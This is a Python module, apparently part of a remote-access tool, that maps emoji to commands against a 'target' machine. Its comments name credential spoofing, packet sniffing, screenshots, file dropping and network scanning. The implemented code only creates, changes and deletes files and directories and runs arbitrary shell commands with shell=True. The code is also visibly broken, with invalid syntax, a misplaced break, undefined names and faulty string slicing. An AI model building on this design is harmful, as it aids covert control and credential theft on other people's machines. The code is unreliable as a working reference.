#!/bin/python3
'''
This file shall contain functions related to executions of commands
1. Execute commands and return their STDOUT and STDERR
2. Return should be in the form of a list/dictionary
3. Feel free to use os/subprocess as required
'''

import emoji
import os
import subprocess

import shutil

from miscellaneous import *


def help():
	pass

# Emoji to use as cmd
open_port = "\U0001F44C"     # Open port to listen for connection        : ok
ss = "\U0001F933"            # Take screenshot                           : selfie
sniff = "\U0001F440"         # To sniff/capture packets on trgt machine  : eyes
greddy = "\U0001F911"        # To spoof creds from trgt                  : money-mouth face
drop = "\U0001F4A3"          # Dropping file/folder on trgt              : bomb
scan = "\U0001F575"          # Scanning networks                         : detective

door = "\U0001F6AA"          # Exiting                                   : door
Help = "\U0001F914"          # help                                      : thinking face
file = "\U0001F4DD"          # file making/file                          : memo
chng_direc = "\U0001F3CE"    # chnging directory                         : racing car
remove  = "\U0001F6AE"       # removing                                  : litter in bin sign
folder = "\U0001F4C1"        # folder					 : file folder

def exit(cmd):
	# exiting
	if cmd == door:
		logger = logthis()
		logger.info(f"{door}: Connection terminated!!")
		break

def help(cmd):
	# help section
	if cmd == Help:
		logger = logthis()
		logger.info(f"{Help}: Showing Help menu")
		Help = help()
		return Help

def touch(cmd):
	# creating file
	if cmd[:10] == file and len(cmd) > 1:
		logger = logthis()
		pwd = os.getcwd()
		abs_path = pwd + '/' + cmd[11:]
		try:
			if(os.path.exists(abs_path)): # checking whether similar named file is present or not
				logger.error(f"{file}: {cmd[11:]} file is already present in {pwd}, please rename the filename")
			else:
				file = open.(cmd[11:], 'w')
				logger.info(f"{file}: {cmd[11:]} file is created in {pwd}")
				file.close()
				return ""
		except Exception as e :
			logger.error(f"{file}: Error Occured While Creating {cmd[11:]} file")
			logger.error(f"Error: {e}")
			return ""

def cd(cmd):
	# changing directory
	if cmd[:10] == chng_direc and len(cmd) > 1:
		logger = logthis()
		pwd = os.getcwd()
		abs_path = pwd + '/' + cmd[11:]
		try:
			if(os.path.isdir(cmd[11:])):
				logger.info(f"{chng_direc}: {cmd[11:]} directory is present")
				os.chdir(abs_path)
				logger.info(f"Changed directory path to {abs_path}")
				return ""
			else:
				logger.error(f"{chng_direc}: No such directory named {cmd[11:]} is present")
				
		except Exception as e:
			logger.error(f"Unable to Change Path to : {abs_path}")
			logger.error(f"Error : {e}")
			return ""

def rm_folder(cmd):
	# Removing folder
	if cmd[:10] == remove and cmd.find(folder) and len(cmd) > 1:
		pwd = os.getcwd()
		abs_path = pwd+'/'+cmd[22:]
		try:
			if(os.path.isdir(cmd[22:])):
				logger.info(f"{remove} and {folder}: {cmd[22:]} Directory is Present")
				shutil.rmtree(abs_path)
				logger.info(f"Removed {abs_path} Directory Path")

			else:
				logger.error(f"{remove} and {folder}: {cmd[22:]} Directory is NOT Present")

		except Exception as e:
			logger.error(f"{remove} and {folder}: Error Occured While Deleting {cmd[22:]}")
			logger.error(f"Error : {e}")
			return ""

def rm_file(cmd):
	# Removing file
	if cmd[:10] == remove and cmd.find(file) and len(cmd) > 1:

		rm(cmd[22:])

def std_operation(cmd):
	list_app = []
	p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr = subprocess.PIPE)
	list_app.extend([p.stdin.read(), p.stdout.read(), p.stderr.read()])
	return list_app

